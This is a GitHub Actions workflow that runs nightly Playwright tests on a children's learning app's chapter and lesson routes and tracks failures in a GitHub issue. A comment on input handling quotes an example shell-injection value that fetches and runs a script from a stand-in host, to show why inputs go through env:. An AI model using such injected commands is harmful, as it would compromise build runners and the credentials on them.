name: Nightly E2E

# THE LAUNCH GATE, ON A TIMER. `all-chapters` asks *does everything a child can reach still open?* —
# the 23 KG–2 chapters at `/game?c=<id>` and the first topic of each of the 36 grade 3–8 modules at
# `/lesson?id=<topic>`, on three frames (laptop, 640×320, 390×844). Its list is written out by hand in
# the spec. Too slow for the PR path, so it lives here; `ci.yml` keeps the fast gates.
#
# ⚠️ FROM 2026-09-13 TO 2026-10 THIS JOB TESTED NOTHING AND SHOWED GREEN. A `legacy-gate` job skipped the
# sweep while `LEGACY_CHAPTERS_HIDDEN` was true, because the sweep drove the `/story` preview, which that
# flag turns off — while the same 23 chapters were live for children at `/game`. The gate is gone; the
# sweep now drives the routes children use, so there is no skip path left to go quiet in.
#
# ⚠️ IT RUNS AGAINST A PRODUCTION BUILD ON THE RUNNER, NEVER AGAINST PRODUCTION.
# Pointing this at the live site would trip Vercel's firewall at roughly the fortieth navigation
# (403 + x-vercel-mitigated: challenge), which Playwright cannot solve, so the run dies as
# net::ERR_ABORTED and reads exactly like a broken chapter. Retries make it slower, not greener.
# See playwright.config.ts for the full write-up. `next start` also matches production more closely
# than `next dev` does: the production CSP (no 'unsafe-eval') and the production React build, which
# is what the "zero console errors" contract is really asserting.
#
# The placeholder Supabase env is the same pair ci.yml uses: `all-chapters` seeds an unsigned session in
# localStorage, opens each route and watches the console — no real auth, no database. The placeholder
# host does not resolve, so the spec excuses failed loads from THAT host only (audio clips, RPCs);
# anything failing from our own origin still fails.

on:
  schedule:
    - cron: '15 3 * * *' # 03:15 UTC
  workflow_dispatch:
    inputs:
      only:
        description: 'Narrow to entries (comma-separated, e.g. counting,g5m1-t1)'
        required: false
        default: ''
      wide_text:
        # ⚠️ A ONE-OFF, DELIBERATELY NOT ON THE TIMER. The scheduled run proves the layout survives
        # the RUNNER's font metrics; this proves it survives a metric 8% wider than any of them, so
        # a device whose fallback is wider than DejaVu cannot be the thing that finds the next one.
        # On the schedule it would become a nightly red that people re-run instead of read, which is
        # the failure this job spent twelve runs demonstrating.
        description: 'Stress the layout with 8% wider text (one-off, not nightly)'
        required: false
        default: 'false'
  # Once on a pull request that touches the sweep, so it is green (or red) on the commit that changes it.
  pull_request:
    paths: ['.github/workflows/nightly-e2e.yml', 'e2e/all-chapters.spec.ts']

permissions:
  contents: read
  issues: write        # the failure notice below is the whole point of running this on a timer

jobs:
  chapters:
    runs-on: ubuntu-latest
    timeout-minutes: 45 # 178 tests took 5.6 min on a laptop (2026-10-05); capped so a hang cannot burn the budget
    env:
      NEXT_PUBLIC_SUPABASE_URL: https://placeholder.supabase.co
      NEXT_PUBLIC_SUPABASE_ANON_KEY: placeholder-anon-key
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24   # = the Vercel project's nodeVersion (24.x); CI must test the Node production runs
          cache: npm

      - run: npm ci
      - run: npx playwright install --with-deps chromium
      - run: npx next build

      - name: Start production server
        run: |
          # nohup + disown so the server survives this step's shell exiting; a plain `&` is the
          # usual way this breaks and it fails as 211 unexplained navigation errors, not as a
          # missing server.
          nohup npx next start -p 3017 > /tmp/next-start.log 2>&1 &
          disown || true
          # Poll rather than sleep: a fixed sleep is either flaky or wasted time, and a server that
          # never comes up should fail HERE with a clear message.
          for i in $(seq 1 60); do
            if [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 http://localhost:3017/api/health)" = "200" ]; then
              echo "server up after ${i}s"; exit 0
            fi
            sleep 1
          done
          echo "::error::server did not become healthy in 60s"; cat /tmp/next-start.log; exit 1

      # ⚠️ E2E_ONLY IS SET ONLY WHEN NON-EMPTY, AND THE SPEC ALSO TREATS EMPTY AS "ALL".
      # A `schedule` run passes '' for the unset input, and the spec's original parse turned '' into
      # an empty-but-TRUTHY array — which skipped every chapter and still reported green. Both ends
      # are fixed; belt and braces, because a nightly that silently tests nothing is worse than none.
      - name: Every chapter and lesson opens (59 routes x 3 frames)
        # ⚠️ THE INPUT ARRIVES VIA `env:`, NEVER INTERPOLATED INTO THE SCRIPT. `${{ }}` is expanded
        # by Actions BEFORE bash sees the line, so `${{ github.event.inputs.only }}` pastes the raw
        # value into the shell as code — an input of `"; curl evil.sh | sh; #` runs on the runner.
        # Through `env:` the value is data bash reads from a variable, and quoting does the rest.
        # Only a collaborator can dispatch this, so it is hardening rather than an open hole; it is
        # two lines, and this runner has repo-scoped credentials in the same workflow file.
        env:
          ONLY_INPUT: ${{ github.event.inputs.only }}
          WIDE_INPUT: ${{ github.event.inputs.wide_text }}
        run: |
          if [ -n "$ONLY_INPUT" ]; then
            export E2E_ONLY="$ONLY_INPUT"
          fi
          if [ "$WIDE_INPUT" = "true" ]; then
            export E2E_WIDE_TEXT=1
            echo "::notice::wide-text stress ON — every glyph 8% wider than it renders anywhere"
          fi
          # tee, so the failure notice below can quote the actual failing tests rather than a link.
          set -o pipefail
          npx playwright test e2e/all-chapters.spec.ts 2>&1 | tee /tmp/e2e.log

      # Traces are retain-on-failure, so this uploads only when there is something to look at —
      # which is the difference between a red nightly you can diagnose and one you re-run blindly.
      - name: Upload traces on failure
        if: failure()
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: playwright-trace-${{ github.run_id }}
          path: test-results/
          retention-days: 14
          if-no-files-found: ignore

      # ⚠️⚠️ A RED NIGHTLY NOBODY IS TOLD ABOUT IS THE SAME FAILURE AS NO NIGHTLY AT ALL.
      # This job was red on all 12 of its first runs, from the day it was created, and nobody read
      # one of them — a real regression (an AR chapter's camera escape hatch hanging off a 640×320
      # screen) sat in the open inside it for seven nights. A scheduled run has no author watching a
      # PR, so the result has to go and find someone: one issue, reopened and updated rather than a
      # new one every night, so it cannot become its own kind of noise.
      - name: File (or update) the failure notice
        if: failure() && github.event_name != 'pull_request'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          TITLE='Nightly E2E is red'
          FAILING=$(grep -E '^\s+✘' /tmp/e2e.log | sed 's/([0-9.]*m*s)//' | head -20 || true)
          [ -n "$FAILING" ] || FAILING='(the run failed before any test reported — see the log)'
          BODY=$(printf '%s\n\n```\n%s\n```\n\n%s\n' \
            "Last red run: $RUN_URL (commit ${GITHUB_SHA:0:7})" "$FAILING" \
            "This issue is updated in place each night it fails, and closed by the first green run.")
          EXISTING=$(gh issue list --state open --search "$TITLE in:title" --json number -q '.[0].number' || true)
          if [ -n "$EXISTING" ]; then
            gh issue comment "$EXISTING" --body "$BODY"
          else
            gh issue create --title "$TITLE" --body "$BODY" --label bug || gh issue create --title "$TITLE" --body "$BODY"
          fi

      # And the other half: a gate that never closes its own ticket teaches people to ignore the
      # ticket instead of the job.
      - name: Close the notice on a green run
        if: success() && github.event_name != 'pull_request'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          EXISTING=$(gh issue list --state open --search 'Nightly E2E is red in:title' --json number -q '.[0].number' || true)
          if [ -n "$EXISTING" ]; then
            gh issue close "$EXISTING" --comment "Green again: $RUN_URL"
          fi
